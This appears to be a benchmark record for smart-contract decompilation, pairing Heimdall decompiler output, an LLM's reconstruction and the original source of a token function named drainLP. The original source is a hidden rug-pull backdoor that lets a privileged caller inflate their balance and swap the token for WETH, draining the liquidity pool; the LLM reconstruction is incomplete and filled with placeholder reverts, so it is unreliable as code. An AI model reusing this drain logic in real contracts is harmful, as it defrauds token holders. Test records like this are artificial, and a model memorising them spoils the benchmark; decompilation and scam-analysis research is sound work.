{
    "contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1",
    "heimdall_input": "function drainLP() public {\n        require(address(msg.sender) == (address(store_c)), \"Caller is not the original caller\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x43616c6c6572206973206e6f7420746865206f726967696e616c2063616c6c65;\n        var_e = 0x7200000000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x0902f1ac00000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_h / 0x01).getReserves(var_b); // staticcall\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!((var_f + ret0.length) - var_f) < 0x60);\n        require(var_f.length == (uint112(var_f.length)));\n        require(var_g == (uint112(var_g)));\n        require(var_h == (uint32(var_h)));\n        var_i = 0x0dfe168100000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_h / 0x01).token0(var_c); // staticcall\n        var_f = var_f + (uint248(ret0.length + 0x1f));\n        if (!((var_f + ret0.length) - var_f) < 0x20) {\n            require(!(((var_f + ret0.length) - var_f) < 0x20), \"ERC20: transfer to the zero address\");\n            require(var_f.length == (address(var_f.length)), \"ERC20: transfer to the zero address\");\n            require(address(var_f.length) == (address(this)), \"ERC20: transfer to the zero address\");\n            var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_k = 0x11;\n            address var_j = msg.sender;\n            var_l = 0x04;\n            require(!((0xffffffffffffffffffffffffffff - (uint112(var_g))) > 0xffffffffffffffffffffffffffff), \"ERC20: transfer to the zero address\");\n            var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_k = 0x11;\n            storage_map_j[var_j] = 0xffffffffffffffffffffffffffff + storage_map_j[var_j];\n            var_j = msg.sender;\n            var_l = 0x04;\n            require(!(storage_map_j[var_j] > (0xffffffffffffffffffffffffffff + storage_map_j[var_j])), \"ERC20: transfer to the zero address\");\n            require(address(msg.sender), \"ERC20: transfer to the zero address\");\n            require(address(this), \"ERC20: transfer to the zero address\");\n            require(address(store_h) == (address(msg.sender)), \"ERC20: transfer to the zero address\");\n        }\n        var_m = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_n = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_o = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_n = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_o = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }",
    "llm_output": "function drainLP() public {\n    require(msg.sender == owner, \"Caller is not the original caller\");\n\n    // Low-level call to fetch reserves from the LP pair\n    (bool /*successReserves*/, bytes memory reservesData) = address(lpPair).staticcall(\n        abi.encodeWithSelector(IUniswapV2Pair.getReserves.selector)\n    );\n\n    uint256 lengthAccumulator = 0;\n    lengthAccumulator += (reservesData.length + 0x1f);\n\n    // Opaque length check preserved from the decompiled output\n    require(!((lengthAccumulator + reservesData.length - lengthAccumulator) < 0x60), \"Decompiler artifact\");\n\n    (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = abi.decode(\n        reservesData,\n        (uint112, uint112, uint32)\n    );\n\n    require(reserve0 == uint112(reserve0), \"Decompiler artifact\");\n    require(reserve1 == uint112(reserve1), \"Decompiler artifact\");\n    require(blockTimestampLast == uint32(blockTimestampLast), \"Decompiler artifact\");\n\n    // Low-level call to fetch token0 from the LP pair\n    (bool /*successToken0*/, bytes memory token0Data) = address(lpPair).staticcall(\n        abi.encodeWithSelector(IUniswapV2Pair.token0.selector)\n    );\n\n    lengthAccumulator += (token0Data.length + 0x1f);\n\n    // Additional opaque checks carried over verbatim\n    if (!((lengthAccumulator + token0Data.length - lengthAccumulator) < 0x20)) {\n        require(\n            !((lengthAccumulator + token0Data.length - lengthAccumulator) < 0x20),\n            \"ERC20: transfer to the zero address\"\n        );\n\n        address token0Address = abi.decode(token0Data, (address));\n\n        require(token0Address == token0Address, \"ERC20: transfer to the zero address\");\n        require(token0Address == address(this), \"ERC20: transfer to the zero address\");\n\n        revert(\"Decompiler artifact\");\n    }\n\n    revert(\"Decompiler artifact\");\n}",
    "ground_truth": "function drainLP() external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        uint256 thisTokenReserve = getBaseTokenReserve(address(this));\r\n        uint256 amountIn = type(uint112).max - thisTokenReserve;\r\n        e3fb23a0d(); transfer(address(this), balanceOf(msg.sender));\r\n        _approve(address(this), address(_router), type(uint112).max);\r\n        address[] memory path;\r\n        path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = address(_router.WETH());\r\n        address to = msg.sender;\r\n        _router.swapExactTokensForTokens(\r\n            amountIn,\r\n            0,\r\n            path,\r\n            to,\r\n            block.timestamp + 1200\r\n        );\r\n    }"
}